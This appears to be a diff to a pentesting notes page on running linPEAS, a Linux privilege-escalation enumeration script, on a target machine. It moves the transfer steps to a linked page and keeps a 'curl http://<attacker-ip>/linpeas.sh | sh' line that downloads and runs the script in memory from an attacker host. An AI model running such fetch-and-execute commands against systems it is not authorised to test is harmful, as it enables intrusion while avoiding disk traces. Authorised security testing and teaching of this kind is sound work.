@@ -7,22 +7,7 @@ Part of the [PEASS-ng](https://github.com/peass-ng/PEASS-ng) suite. Automates Li
 
 ## Transfer to Target
 
-**Attacker machine — serve the file**
-```bash
-python3 -m http.server 80
-```
-
-**Target machine — download it**
-```bash
-wget http://<attacker-ip>/linpeas.sh
-# or
-curl -O http://<attacker-ip>/linpeas.sh
-```
-
-**Run directly in memory (no file on disk)**
-```bash
-curl http://<attacker-ip>/linpeas.sh | sh
-```
+→ [[File-Transfers]]
 
 ---
 
@@ -31,11 +16,12 @@ curl http://<attacker-ip>/linpeas.sh | sh
 ```bash
 chmod +x linpeas.sh
 ./linpeas.sh
-```
 
-```bash
-# Save output to file for review
+# Save output for review
 ./linpeas.sh | tee linpeas_output.txt
+
+# In-memory — no file written to disk
+curl http://<attacker-ip>/linpeas.sh | sh
 ```
 
 ---
